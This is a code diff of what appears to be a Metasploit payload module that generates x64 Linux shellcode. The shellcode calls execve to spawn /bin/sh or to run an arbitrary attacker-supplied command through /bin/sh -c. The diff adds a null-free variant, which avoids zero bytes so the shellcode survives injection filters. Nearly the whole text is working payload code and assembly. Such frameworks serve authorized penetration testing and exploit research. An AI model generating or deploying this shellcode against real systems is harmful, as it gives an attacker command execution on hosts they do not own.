@@ -4,46 +4,185 @@
 ##
 
 module MetasploitModule
-
-  CachedSize = 47
+  CachedSize = 44
 
   include Msf::Payload::Single
-  include Msf::Payload::Linux
+  include Msf::Payload::Linux::X64::Prepends
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Linux Execute Command',
-      'Description'   => 'Execute an arbitrary command',
-      'Author'        => 'ricky',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'linux',
-      'Arch'          => ARCH_X64))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Linux Execute Command',
+        'Description' => 'Execute an arbitrary command or just a /bin/sh shell',
+        'Author' => [
+          'ricky',
+          'Geyslan G. Bem <geyslan[at]gmail.com>'
+        ],
+        'License' => MSF_LICENSE,
+        'Platform' => 'linux',
+        'Arch' => ARCH_X64
+      )
+    )
 
     register_options(
       [
-        OptString.new('CMD',  [ true,  "The command string to execute" ]),
-      ])
+        OptString.new('CMD', [ false, 'The command string to execute' ]),
+      ]
+    )
+    register_advanced_options(
+      [
+        OptBool.new('NullFreeVersion', [ true, 'Null-free shellcode version', false ])
+      ]
+    )
   end
 
-  def generate_stage(opts={})
-    cmd = (datastore['CMD'] || '') + "\x00"
-    call = "\xe8" + [cmd.length].pack('V')
-    payload =
-      "\x6a\x3b"                     + # pushq  $0x3b
-      "\x58"                         + # pop    %rax
-      "\x99"                         + # cltd
-      "\x48\xbb\x2f\x62\x69\x6e\x2f" + # movabs $0x68732f6e69622f,%rbx
-      "\x73\x68\x00"                 + #
-      "\x53"                         + # push   %rbx
-      "\x48\x89\xe7"                 + # mov    %rsp,%rdi
-      "\x68\x2d\x63\x00\x00"         + # pushq  $0x632d
-      "\x48\x89\xe6"                 + # mov    %rsp,%rsi
-      "\x52"                         + # push   %rdx
-      call                           + # callq  2d <run>
-      cmd                            + # .ascii "cmd\0"
-      "\x56"                         + # push   %rsi
-      "\x57"                         + # push   %rdi
-      "\x48\x89\xe6"                 + # mov    %rsp,%rsi
-      "\x0f\x05"                       # syscall
+  def generate(_opts = {})
+    cmd = datastore['CMD'] || ''
+    cmd_length = cmd.bytesize
+    nullfreeversion = datastore['NullFreeVersion']
+
+    if cmd.empty?
+      #
+      # Builds the exec payload which executes a /bin/sh shell.
+      # execve("/bin/sh", NULL, NULL)
+      #
+      if nullfreeversion
+        # 22 bytes (null-free)
+        payload = <<-EOS
+            mov rax, 0x68732f6e69622f2f
+            cdq                     ; edx = NULL
+
+            push rdx
+            push rax
+            push rsp
+            pop rdi                 ; "//bin/sh"
+
+            push rdx
+            pop rsi                 ; NULL
+
+            push 0x3b
+            pop rax
+
+            syscall                 ; execve("//bin/sh", NULL, NULL)
+        EOS
+
+      else
+        # 21 bytes (not null-free)
+        payload = <<-EOS
+            mov rax, 0x68732f6e69622f
+            cdq                     ; edx = NULL
+
+            push rax
+            push rsp
+            pop rdi                 ; "/bin/sh"
+
+            push rdx
+            pop rsi                 ; NULL
+
+            push 0x3b
+            pop rax
+
+            syscall                 ; execve("/bin/sh", NULL, NULL)
+        EOS
+      end
+    else
+      #
+      # Dynamically builds the exec payload based on the user's options.
+      # execve("/bin/sh", ["/bin/sh", "-c", "CMD"], NULL)
+      #
+      pushw_c_opt = 'dd 0x632d6866' # pushw 0x632d (metasm doesn't support pushw)
+
+      if nullfreeversion
+        if cmd_length > 0xffff
+          raise RangeError, 'CMD length has to be smaller than %d' % 0xffff, caller
+        end
+
+        # Null-free: raw bytes without terminator (patched at runtime)
+        cmd_bytes = Metasm::Shellcode.define_data(cmd)
+        if cmd_length <= 0xff # 255
+          breg = 'bl'
+        else
+          breg = 'bx'
+          if (cmd_length & 0xff) == 0 # let's avoid zeroed bytes
+            cmd_bytes += ', 0x20'
+            cmd_length += 1
+          end
+        end
+        mov_cmd_len_to_breg = "mov #{breg}, #{cmd_length}"
+
+        # 48 bytes without cmd (null-free)
+        payload = <<-EOS
+            mov rax, 0x68732f6e69622f2f
+            cdq                     ; edx = NULL
+
+            jmp tocall              ; jmp/call/pop cmd address
+          afterjmp:
+            pop rbp                 ; *CMD*
+
+            push rdx
+            pop rbx
+            #{mov_cmd_len_to_breg}  ; mov (byte/word) (bl/bx), cmd.length
+            mov [rbp + rbx], dl     ; NUL '\0' terminate cmd
+
+            push rdx
+            #{pushw_c_opt}
+            push rsp
+            pop rsi                 ; "-c"
+
+            push rdx
+            push rax
+            push rsp
+            pop rdi                 ; "//bin/sh"
+
+            push rdx                ; NULL
+            push rbp                ; *CMD*
+            push rsi                ; "-c"
+            push rdi                ; "//bin/sh"
+            push rsp
+            pop rsi                 ; ["//bin/sh", "-c", "*CMD*"]
+
+            push 0x3b
+            pop rax
+
+            syscall                 ; execve("//bin/sh", ["//bin/sh", "-c", "*CMD*"], NULL)
+          tocall:
+            call afterjmp
+            #{cmd_bytes}                  ; arbitrary command
+        EOS
+      else
+        # Non-null-free: null-terminated cstring
+        cmd_cstring = Metasm::Shellcode.define_cstring(cmd)
+        # 37 bytes without cmd (not null-free)
+        payload = <<-EOS
+            mov rax, 0x68732f6e69622f
+            cdq                     ; edx = NULL
+
+            push rax
+            push rsp
+            pop rdi                 ; "/bin/sh"
+
+            push rdx
+            #{pushw_c_opt}
+            push rsp
+            pop rsi                 ; "-c"
+
+            push rdx                ; NULL
+            call continue
+            #{cmd_cstring}            ; arbitrary command
+          continue:
+            push rsi                ; "-c"
+            push rdi                ; "/bin/sh"
+            push rsp
+            pop rsi                 ; ["/bin/sh", "-c", "*CMD*"]
+
+            push 0x3b
+            pop rax
+
+            syscall                 ; execve("/bin/sh", ["/bin/sh", "-c", "*CMD*"], NULL)
+        EOS
+      end
+    end
+    Metasm::Shellcode.assemble(Metasm::X64.new, payload).encode_string
   end
 end
